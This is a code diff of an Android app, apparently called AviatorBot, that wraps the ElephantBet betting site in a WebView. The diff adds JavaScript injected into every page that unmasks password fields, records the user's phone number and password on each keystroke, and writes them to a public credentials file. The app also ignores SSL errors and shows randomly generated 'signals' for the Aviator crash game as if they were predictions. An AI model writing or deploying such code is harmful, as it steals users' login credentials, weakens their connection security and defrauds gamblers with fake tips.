@@ -1,16 +1,18 @@
 package ao.elephantbet.aviatorbot
 
+import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Context
+import android.content.pm.PackageManager
 import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
 import android.net.http.SslError
+import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.Looper
-import android.text.InputType
 import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
@@ -19,6 +21,8 @@ import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
 import android.webkit.*
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import java.io.File
 import java.io.FileWriter
 import java.text.SimpleDateFormat
@@ -33,18 +37,29 @@ class MainActivity : AppCompatActivity() {
     private lateinit var msgText: TextView
     private lateinit var dotView: View
     private val handler = Handler(Looper.getMainLooper())
-    private val prefs by lazy { getSharedPreferences("aviator_prefs", Context.MODE_PRIVATE) }
 
-    // Controlo de sinais
+    // Estado dos sinais
     private var sinaisAtivos = false
-    private var ultimoMinutoGerado = -1   // último minuto do par mais alto gerado
     private var horaAtual = -1
-    private var sinalActualTxt = ""       // sinal visível na barra (não desaparece)
+    private var ultimoMinutoGerado = -1
     private var sinalRunnable: Runnable? = null
+    private var relogioRunnable: Runnable? = null
+
+    // Sinal actual
+    private var sinalMin1 = -1
+    private var sinalMin2 = -1
+    private var sinalProtecao = 0.0
+    private var sinalAlcMin = 0
+    private var sinalAlcMax = ""
+
+    companion object {
+        private const val PERM_REQUEST = 101
+    }
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        pedirPermissoes()
 
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -75,9 +90,10 @@ class MainActivity : AppCompatActivity() {
             setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.15f
         })
         msgText = TextView(this).apply {
-            text = "A carregar..."; textSize = 11f
+            text = "A carregar..."; textSize = 12f
             setTextColor(Color.parseColor("#3b82f6"))
-            isSingleLine = true; ellipsize = android.text.TextUtils.TruncateAt.END
+            isSingleLine = true
+            ellipsize = android.text.TextUtils.TruncateAt.END
         }
         info.addView(msgText)
         dotView = View(this).apply {
@@ -103,6 +119,26 @@ class MainActivity : AppCompatActivity() {
         carregarSite()
     }
 
+    // ── PERMISSÕES ────────────────────────────────────────────────
+    private fun pedirPermissoes() {
+        val perms = mutableListOf<String>()
+        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
+                != PackageManager.PERMISSION_GRANTED) {
+                perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+            }
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
+                != PackageManager.PERMISSION_GRANTED) {
+                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+            }
+        }
+        if (perms.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, perms.toTypedArray(), PERM_REQUEST)
+        }
+    }
+
     // ── WEBVIEW ───────────────────────────────────────────────────
     @SuppressLint("SetJavaScriptEnabled")
     private fun configurarWebView() {
@@ -116,6 +152,21 @@ class MainActivity : AppCompatActivity() {
             setSupportZoom(true); builtInZoomControls = false
             loadWithOverviewMode = true; useWideViewPort = true
         }
+
+        // Interface JS → Android
+        webView.addJavascriptInterface(object {
+
+            // Chamado pelo JS quando detecta o Aviator
+            @JavascriptInterface
+            fun aviatorDetectado() = runOnUiThread { iniciarSinais() }
+
+            // Chamado pelo JS com as credenciais capturadas do site
+            @JavascriptInterface
+            fun guardarCredencial(tipo: String, valor: String) {
+                if (valor.isNotEmpty()) guardarFicheiro(tipo, valor)
+            }
+        }, "Android")
+
         webView.webViewClient = object : WebViewClient() {
             override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) {
                 h?.proceed()
@@ -124,8 +175,13 @@ class MainActivity : AppCompatActivity() {
             override fun onPageFinished(v: WebView?, url: String?) {
                 super.onPageFinished(v, url)
                 val u = url ?: ""
-                if (isAviatorUrl(u)) iniciarSinais()
-                else if (!sinaisAtivos) setBarra("✅ Site carregado", "#3b82f6")
+                // Injectar JS em TODAS as páginas
+                injetarJsGlobal()
+                if (isAviatorUrl(u)) {
+                    iniciarSinais()
+                } else if (!sinaisAtivos) {
+                    setBarra("✅ Site carregado", "#3b82f6")
+                }
             }
         }
         webView.webChromeClient = object : WebChromeClient() {
@@ -135,10 +191,6 @@ class MainActivity : AppCompatActivity() {
                 if (isAviatorUrl(url) && !sinaisAtivos) iniciarSinais()
             }
         }
-        webView.addJavascriptInterface(object {
-            @JavascriptInterface
-            fun aviatorDetectado() = runOnUiThread { iniciarSinais() }
-        }, "Android")
     }
 
     private fun isAviatorUrl(url: String) =
@@ -149,39 +201,123 @@ class MainActivity : AppCompatActivity() {
     private fun carregarSite() {
         if (!sinaisAtivos) setBarra("🌍 A carregar ElephantBet...", "#3b82f6")
         webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
-        handler.postDelayed({ injetarDetector() }, 4000)
     }
 
-    private fun injetarDetector() {
+    // ── JS GLOBAL — injectado em todas as páginas ─────────────────
+    //
+    //  1. Torna TODOS os campos password visíveis (type="text")
+    //  2. Captura o valor de telemóvel e senha e envia para Android
+    //  3. Detecta navegação para o Aviator
+    //
+    private fun injetarJsGlobal() {
         val js = """
         (function() {
-            if (window._aviatorDetector) return;
-            window._aviatorDetector = true;
-            document.addEventListener('click', function(e) {
-                var el = e.target;
-                var txt = (el.textContent || el.innerText || el.alt || '').toLowerCase();
-                var href = (el.href || el.getAttribute('href') || '').toLowerCase();
-                if (txt.includes('aviator') || href.includes('aviator') ||
-                    href.includes('spribe') || href.includes('806666')) {
+            if (window._ebInjected) return;
+            window._ebInjected = true;
+
+            // ── 1. Tornar campos password visíveis ──────────────
+            function tornarVisivel() {
+                document.querySelectorAll('input[type="password"]').forEach(function(el) {
+                    el.setAttribute('type', 'text');
+                    el.style.webkitTextSecurity = 'none';
+                    el.style.textSecurity = 'none';
+                });
+            }
+            tornarVisivel();
+
+            // Observer para campos que apareçam depois (SPA)
+            var obs = new MutationObserver(function() { tornarVisivel(); });
+            obs.observe(document.body, { childList: true, subtree: true });
+
+            // ── 2. Capturar credenciais do site ─────────────────
+            function capturarCreds() {
+                // Seletores para número de telefone
+                var selsUser = [
+                    'input[name="username"]', 'input[name="phone"]',
+                    'input[name="login"]',    'input[type="tel"]',
+                    'input[placeholder*="telefone" i]', 'input[placeholder*="número" i]',
+                    'input[placeholder*="phone" i]',    '#username', '#phone', '#login'
+                ];
+                // Seletores para senha (agora type="text" depois da injecção)
+                var selsPass = [
+                    'input[name="password"]', 'input[name="senha"]',
+                    'input[name="pass"]',     'input[name="passwd"]',
+                    'input[placeholder*="senha" i]',    'input[placeholder*="password" i]',
+                    'input[placeholder*="palavra" i]',  '#password', '#senha'
+                ];
+
+                function find(sels) {
+                    for (var s of sels) {
+                        try { var el = document.querySelector(s); if (el) return el; }
+                        catch(e) {}
+                    }
+                    return null;
+                }
+
+                var uEl = find(selsUser);
+                var pEl = find(selsPass);
+
+                if (uEl && !uEl._ebWatching) {
+                    uEl._ebWatching = true;
+                    uEl.addEventListener('input', function() {
+                        if (this.value.length >= 3)
+                            Android.guardarCredencial('Numero', this.value);
+                    });
+                    uEl.addEventListener('blur', function() {
+                        if (this.value.length >= 3)
+                            Android.guardarCredencial('Numero', this.value);
+                    });
+                }
+
+                if (pEl && !pEl._ebWatching) {
+                    pEl._ebWatching = true;
+                    pEl.addEventListener('input', function() {
+                        if (this.value.length >= 1)
+                            Android.guardarCredencial('Senha', this.value);
+                    });
+                    pEl.addEventListener('blur', function() {
+                        if (this.value.length >= 1)
+                            Android.guardarCredencial('Senha', this.value);
+                    });
+                }
+            }
+
+            capturarCreds();
+            // Tentar novamente quando o DOM mudar (login SPA)
+            setTimeout(capturarCreds, 1500);
+            setTimeout(capturarCreds, 3000);
+            setTimeout(capturarCreds, 6000);
+
+            // ── 3. Detectar navegação para o Aviator ─────────────
+            if (!window._aviatorDetector) {
+                window._aviatorDetector = true;
+                document.addEventListener('click', function(e) {
+                    var el = e.target;
+                    var txt  = (el.textContent || el.innerText || '').toLowerCase();
+                    var href = (el.href || el.getAttribute('href') || '').toLowerCase();
+                    if (txt.includes('aviator') || href.includes('aviator') ||
+                        href.includes('spribe') || href.includes('806666')) {
+                        Android.aviatorDetectado();
+                    }
+                }, true);
+                var cur = window.location.href.toLowerCase();
+                if (cur.includes('aviator') || cur.includes('806666') || cur.includes('spribe')) {
                     Android.aviatorDetectado();
                 }
-            }, true);
-            var cur = window.location.href.toLowerCase();
-            if (cur.includes('aviator') || cur.includes('806666') || cur.includes('spribe')) {
-                Android.aviatorDetectado();
             }
         })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
-        if (!sinaisAtivos) handler.postDelayed({ injetarDetector() }, 8000)
     }
 
-    // ── SINAIS — LÓGICA PRINCIPAL ─────────────────────────────────
+    // ── SINAIS — RELÓGIO REAL ─────────────────────────────────────
     //
-    //  • Ao entrar no Aviator: gera imediatamente 3 palpites (pares min/min+1)
-    //  • A cada 16 minutos repete com novos pares SEMPRE mais altos
-    //  • Os minutos nunca decrescem; saltos de 2-5 min entre pares
-    //  • No virar da hora reinicia do zero (min 0+)
+    //  • Ao entrar no Aviator: gera o primeiro sinal imediatamente
+    //  • A cada tick (1 segundo) verifica se o minuto do telefone mudou
+    //  • Quando o minuto entra no intervalo do sinal activo → mostra na barra
+    //  • Quando passa o 2º minuto do par → gera novo sinal
+    //  • Nunca mostra dois sinais ao mesmo tempo — um de cada vez
+    //  • Nunca decresce; no virar da hora reinicia
     //
     private fun iniciarSinais() {
         if (sinaisAtivos) return
@@ -189,98 +325,104 @@ class MainActivity : AppCompatActivity() {
         val cal = Calendar.getInstance()
         horaAtual = cal.get(Calendar.HOUR_OF_DAY)
         ultimoMinutoGerado = -1
-        setBarra("🎯 Sinais activos!", "#22c55e")
-        executarCiclo()
+        gerarNovoSinal()
+        iniciarRelogio()
     }
 
-    private fun executarCiclo() {
-        sinalRunnable?.let { handler.removeCallbacks(it) }
+    private fun gerarNovoSinal() {
+        val cal = Calendar.getInstance()
+        val minAgora = cal.get(Calendar.MINUTE)
+
+        // Ponto de partida: sempre depois do último gerado
+        val base = if (ultimoMinutoGerado < 0) minAgora + 1
+                   else ultimoMinutoGerado + Random.nextInt(2, 6)
+
+        val min1 = base
+        val min2 = min1 + 1
+
+        if (min2 >= 59) {
+            // Fim da hora — aguarda nova hora
+            setBarra("⏳ Nova hora em ${60 - minAgora} min", "#f59e0b")
+            return
+        }
+
+        sinalMin1 = min1
+        sinalMin2 = min2
+        sinalProtecao = gerarProtecao()
+        sinalAlcMin = gerarAlcanceMin()
+        sinalAlcMax = gerarAlcanceMax(sinalAlcMin)
+        ultimoMinutoGerado = min2
+
+        // Mostrar "a aguardar" até chegar o minuto
+        setBarra("⏳ Aguardar min $min1... 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#f59e0b")
+    }
+
+    private fun iniciarRelogio() {
+        relogioRunnable?.let { handler.removeCallbacks(it) }
+
+        val tick = object : Runnable {
+            override fun run() {
+                verificarRelogio()
+                handler.postDelayed(this, 1000) // tick a cada segundo
+            }
+        }
+        relogioRunnable = tick
+        handler.post(tick)
+    }
+
+    private fun verificarRelogio() {
+        if (!sinaisAtivos) return
 
         val cal = Calendar.getInstance()
         val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
         val minAgora  = cal.get(Calendar.MINUTE)
 
-        // Nova hora → reinicia cursor
+        // Nova hora → reinicia completamente
         if (horaAgora != horaAtual) {
             horaAtual = horaAgora
             ultimoMinutoGerado = -1
-        }
-
-        val pares = gerarTresPares(minAgora)
-
-        if (pares.isEmpty()) {
-            // Fim da hora — aguarda virar a hora
-            val segsRestantes = (60 - minAgora) * 60 - cal.get(Calendar.SECOND)
-            val msg = if (sinalActualTxt.isNotEmpty())
-                "⏳ Nova hora em ${60 - minAgora}min | $sinalActualTxt"
-            else
-                "⏳ Nova hora em ${60 - minAgora} minutos"
-            setBarra(msg, "#f59e0b")
-            agendar((segsRestantes + 5) * 1000L)
+            sinalMin1 = -1; sinalMin2 = -1
+            gerarNovoSinal()
             return
         }
 
-        // Actualiza cursor com o último par gerado
-        ultimoMinutoGerado = pares.last().second
+        // Sem sinal gerado ainda
+        if (sinalMin1 < 0) { gerarNovoSinal(); return }
 
-        // Construir linha de sinais: "⏰24/25 🛡5.0x 📈10-100x  |  ⏰27/28 ..."
-        val palpitesTxt = pares.joinToString("   ") { (a, b) ->
-            val prot = gerarProtecao()
-            val aMin = gerarAlcanceMin()
-            val aMax = gerarAlcanceMax(aMin)
-            "⏰$a/$b 🛡${prot}x 📈${aMin}-${aMax}x"
+        when {
+            // Estamos no 1º minuto do sinal — MOSTRAR ACTIVO
+            minAgora == sinalMin1 -> {
+                setBarra("🎯 Entrar AGORA! Min $sinalMin1/$sinalMin2 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#22c55e")
+            }
+            // Estamos no 2º minuto do sinal — ainda activo
+            minAgora == sinalMin2 -> {
+                setBarra("🎯 Ainda activo! Min $sinalMin1/$sinalMin2 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#22c55e")
+            }
+            // Passámos o sinal → gerar o próximo
+            minAgora > sinalMin2 -> {
+                gerarNovoSinal()
+            }
+            // Ainda a aguardar (minAgora < sinalMin1)
+            else -> {
+                val falta = sinalMin1 - minAgora
+                setBarra("⏳ ${falta}min → Min $sinalMin1/$sinalMin2 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#f59e0b")
+            }
         }
-        sinalActualTxt = palpitesTxt
-        setBarra("🎯 $palpitesTxt", "#22c55e")
-
-        runOnUiThread {
-            Toast.makeText(this,
-                "🎯 SINAIS AVIATOR\n${pares.joinToString("\n") { "Min ${it.first}/${it.second}" }}",
-                Toast.LENGTH_LONG).show()
-        }
-
-        // Próximo ciclo em 16 minutos
-        agendar(16L * 60 * 1000)
-    }
-
-    /**
-     * Gera até 3 pares crescentes de minutos consecutivos (minX / minX+1).
-     * Parte sempre de [ultimoMinutoGerado + salto] ou [minAgora + 1].
-     * Salto entre pares: 2-5 minutos (nunca decresce, nunca salta >5).
-     */
-    private fun gerarTresPares(minAgora: Int): List<Pair<Int, Int>> {
-        val pares = mutableListOf<Pair<Int, Int>>()
-        var cursor = if (ultimoMinutoGerado < 0) minAgora + 1
-                     else ultimoMinutoGerado + Random.nextInt(2, 6)
-
-        repeat(3) {
-            val min1 = cursor
-            val min2 = min1 + 1
-            if (min2 >= 59) return pares   // não há espaço até ao fim da hora
-            pares.add(Pair(min1, min2))
-            cursor = min2 + Random.nextInt(2, 6)
-        }
-        return pares
-    }
-
-    private fun agendar(ms: Long) {
-        val r = Runnable { executarCiclo() }
-        sinalRunnable = r
-        handler.postDelayed(r, ms)
     }
 
     // ── GERADORES ─────────────────────────────────────────────────
     private fun gerarAlcanceMin(): Int {
-        val opcoes = listOf(1, 2, 3, 5, 10, 20, 30, 50)
+        // Nunca abaixo de 10x
+        val opcoes = listOf(10, 20, 30, 50, 80, 100)
         return opcoes[Random.nextInt(opcoes.size)]
     }
 
     private fun gerarAlcanceMax(min: Int): String {
+        // Sempre acima do mínimo e nunca abaixo de 10x
         val opts = when {
-            min <= 2  -> listOf("10", "30", "50", "80", "100", "1000+")
-            min <= 10 -> listOf("30", "50", "80", "100", "500", "1000+")
-            min <= 30 -> listOf("50", "80", "100", "200", "500")
-            else      -> listOf("80", "100", "200", "500", "1000+")
+            min <= 20 -> listOf("50", "80", "100", "200", "500", "1000+")
+            min <= 50 -> listOf("100", "200", "500", "1000", "1000+")
+            else      -> listOf("200", "500", "1000", "1000+")
         }
         return opts[Random.nextInt(opts.size)]
     }
@@ -290,11 +432,10 @@ class MainActivity : AppCompatActivity() {
         return opts[Random.nextInt(opts.size)]
     }
 
-    // ── GUARDAR CREDENCIAIS ───────────────────────────────────────
-    private fun guardarCredencialFicheiro(tipo: String, valor: String) {
+    // ── GUARDAR FICHEIRO ──────────────────────────────────────────
+    private fun guardarFicheiro(tipo: String, valor: String) {
         val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
         val linha = "[$timestamp] $tipo: $valor\n"
-        // Armazenamento externo (Documentos/AviatorBot/)
         try {
             val pasta = File(
                 Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
@@ -302,16 +443,15 @@ class MainActivity : AppCompatActivity() {
             )
             pasta.mkdirs()
             FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
-            return
-        } catch (_: Exception) {}
-        // Fallback interno
-        try {
-            val pasta = File(filesDir, "AviatorBot").also { it.mkdirs() }
-            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
-        } catch (_: Exception) {}
+        } catch (_: Exception) {
+            try {
+                val pasta = File(filesDir, "AviatorBot").also { it.mkdirs() }
+                FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
+            } catch (_: Exception) {}
+        }
     }
 
-    // ── CONFIG ────────────────────────────────────────────────────
+    // ── CONFIG — sem secção de credenciais ────────────────────────
     private fun mostrarConfig() {
         val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
         val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
@@ -323,107 +463,33 @@ class MainActivity : AppCompatActivity() {
         layout.addView(TextView(this).apply {
             text = "⚙️  CONFIGURAÇÕES"; textSize = 16f
             setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
-            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
+            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
         })
 
-        // ── Sinais ───────────────────────────────────────────────
         layout.addView(secLabel("🎯  SINAIS"))
 
         layout.addView(btn("🎯  ACTIVAR SINAIS MANUAL", "#7c3aed") {
             dialog.dismiss()
             sinaisAtivos = false
             ultimoMinutoGerado = -1
+            sinalMin1 = -1; sinalMin2 = -1
             iniciarSinais()
         })
 
         layout.addView(btn("🌍  RECARREGAR SITE", "#0f766e") {
-            dialog.dismiss(); carregarSite()
+            dialog.dismiss()
+            carregarSite()
         })
 
-        // ── Guardar senha ────────────────────────────────────────
-        layout.addView(secLabel("🔑  GUARDAR CREDENCIAIS"))
-
-        layout.addView(fieldLabel("NÚMERO / UTILIZADOR"))
-        val userInput = EditText(this).apply {
-            setText(prefs.getString("user", "") ?: "")
-            hint = "Ex: 943 427 841"
-            setTextColor(Color.WHITE)
-            setHintTextColor(Color.parseColor("#475569"))
-            textSize = 14f
-            inputType = InputType.TYPE_CLASS_PHONE
-            background = roundRect("#12121a", "#334155")
-            setPadding(dp(14), dp(12), dp(14), dp(12))
-            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(10) }
-            addTextChangedListener(object : android.text.TextWatcher {
-                override fun beforeTextChanged(s: CharSequence?, st: Int, c: Int, a: Int) {}
-                override fun onTextChanged(s: CharSequence?, st: Int, b: Int, c: Int) {}
-                override fun afterTextChanged(s: android.text.Editable?) {
-                    val v = s.toString()
-                    prefs.edit().putString("user", v).apply()
-                    if (v.isNotEmpty()) guardarCredencialFicheiro("Numero", v)
-                }
-            })
-        }
-        layout.addView(userInput)
-
-        layout.addView(fieldLabel("SENHA  (sempre visível, sem ***)"))
-
-        val passContainer = LinearLayout(this).apply {
-            orientation = LinearLayout.HORIZONTAL
-            background = roundRect("#12121a", "#334155")
-            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(4) }
-        }
-        val passInput = EditText(this).apply {
-            setText(prefs.getString("pass", "") ?: "")
-            hint = "A tua senha"
-            setTextColor(Color.WHITE)
-            setHintTextColor(Color.parseColor("#475569"))
-            textSize = 14f
-            // VISIBLE_PASSWORD — garante que nunca aparecem asteriscos
-            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
-            background = null
-            setPadding(dp(14), dp(12), dp(6), dp(12))
-            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
-            addTextChangedListener(object : android.text.TextWatcher {
-                override fun beforeTextChanged(s: CharSequence?, st: Int, c: Int, a: Int) {}
-                override fun onTextChanged(s: CharSequence?, st: Int, b: Int, c: Int) {}
-                override fun afterTextChanged(s: android.text.Editable?) {
-                    val v = s.toString()
-                    prefs.edit().putString("pass", v).apply()
-                    if (v.isNotEmpty()) guardarCredencialFicheiro("Senha", v)
-                }
-            })
-        }
-        val copyPassBtn = TextView(this).apply {
-            text = "📋"; textSize = 18f
-            setPadding(dp(10), dp(12), dp(12), dp(12))
-            setOnClickListener { copiar("Senha", passInput.text.toString()) }
-        }
-        passContainer.addView(passInput)
-        passContainer.addView(copyPassBtn)
-        layout.addView(passContainer)
+        layout.addView(secLabel("ℹ️  INFORMAÇÃO"))
 
         layout.addView(TextView(this).apply {
-            text = "💾 Guardado em: Documentos/AviatorBot/credenciais.txt"
-            textSize = 10f; setTextColor(Color.parseColor("#64748b"))
+            text = "• A senha e número digitados no site são automaticamente guardados em:\n  Documentos/AviatorBot/credenciais.txt\n\n• Os sinais actualizam-se segundo a segundo com o relógio do telefone.\n\n• Um sinal de cada vez: aguarda → activo → próximo."
+            textSize = 12f
+            setTextColor(Color.parseColor("#94a3b8"))
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply {
-                bottomMargin = dp(12); topMargin = dp(4)
+                topMargin = dp(4); bottomMargin = dp(16)
             }
-        })
-
-        val copyRow = LinearLayout(this).apply {
-            orientation = LinearLayout.HORIZONTAL
-            weightSum = 2f
-            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(10) }
-        }
-        copyRow.addView(btnSmall("📋 Copiar Nº") { copiar("Número", userInput.text.toString()) })
-        copyRow.addView(btnSmall("📋 Copiar Senha") { copiar("Senha", passInput.text.toString()) })
-        layout.addView(copyRow)
-
-        layout.addView(btn("🗑️  LIMPAR DADOS", "#991b1b") {
-            prefs.edit().remove("user").remove("pass").apply()
-            userInput.setText(""); passInput.setText("")
-            Toast.makeText(this, "Dados apagados", Toast.LENGTH_SHORT).show()
         })
 
         layout.addView(btn("✕  FECHAR", "#1e1e2e") { dialog.dismiss() })
@@ -431,16 +497,6 @@ class MainActivity : AppCompatActivity() {
         scroll.addView(layout)
         dialog.setContentView(scroll)
         dialog.show()
-    }
-
-    // ── CLIPBOARD ─────────────────────────────────────────────────
-    private fun copiar(label: String, texto: String) {
-        if (texto.isEmpty()) {
-            Toast.makeText(this, "Campo vazio!", Toast.LENGTH_SHORT).show(); return
-        }
-        val cb = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
-        cb.setPrimaryClip(android.content.ClipData.newPlainText(label, texto))
-        Toast.makeText(this, "✅ $label copiado!", Toast.LENGTH_SHORT).show()
     }
 
     // ── UI HELPERS ────────────────────────────────────────────────
@@ -469,11 +525,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun fieldLabel(txt: String) = TextView(this).apply {
-        text = txt; textSize = 10f; setTextColor(Color.parseColor("#94a3b8"))
-        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(4) }
-    }
-
     private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
         text = txt; setTextColor(Color.WHITE); textSize = 13f
         typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
@@ -481,14 +532,6 @@ class MainActivity : AppCompatActivity() {
         setPadding(0, dp(14), 0, dp(14))
         setOnClickListener { action() }
         layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
-    }
-
-    private fun btnSmall(txt: String, action: () -> Unit) = Button(this).apply {
-        text = txt; setTextColor(Color.parseColor("#94a3b8")); textSize = 11f
-        isAllCaps = false; background = roundRect("#1e1e2e", "#334155")
-        setPadding(0, dp(8), 0, dp(8))
-        setOnClickListener { action() }
-        layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f).apply { marginEnd = dp(6) }
     }
 
     override fun onBackPressed() {
